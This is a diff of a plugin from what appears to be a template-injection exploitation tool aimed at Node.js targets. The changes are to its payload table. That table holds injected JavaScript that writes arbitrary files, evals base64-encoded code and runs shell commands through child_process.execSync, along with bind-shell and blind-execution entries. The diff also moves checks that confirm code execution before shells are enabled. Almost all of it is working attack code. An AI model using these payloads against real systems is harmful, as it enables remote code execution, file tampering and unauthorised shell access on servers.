@@ -29,7 +29,7 @@ class Javascript(Plugin):
             # No evaluate_blind here, since we've no sleep, we'll use inject
             'write' : {
                 'call' : 'inject',
-                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')//""",
                 'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
             },
             'read' : {
@@ -42,7 +42,9 @@ class Javascript(Plugin):
             },
             'evaluate' : {
                 'call': 'render',
-                'evaluate': """eval(Buffer('%(code_b64)s', 'base64').toString())"""
+                'evaluate': """eval(Buffer('%(code_b64)s', 'base64').toString())""",
+                'test_os': """require('os').platform()""",
+                'test_os_expected': '^[\w-]+$',
             },
             'blind' : {
                 'call': 'execute_blind',
@@ -58,7 +60,9 @@ class Javascript(Plugin):
             },
             'execute' : {
                 'call': 'render',
-                'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
+                'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2] 
             },
             'bind_shell' : {
                 'call' : 'execute_blind',
@@ -87,31 +91,6 @@ class Javascript(Plugin):
         ])
 
     language = 'javascript'
-
-    def rendered_detected(self):
-
-        os = self.evaluate("""require('os').platform()""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
-
-
-    def blind_detected(self):
-
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
-            self.set('execute_blind', True)
-            self.set('write', True)
-            self.set('bind_shell', True)
-            self.set('reverse_shell', True)
 
 ctx_closures = {
         1: [
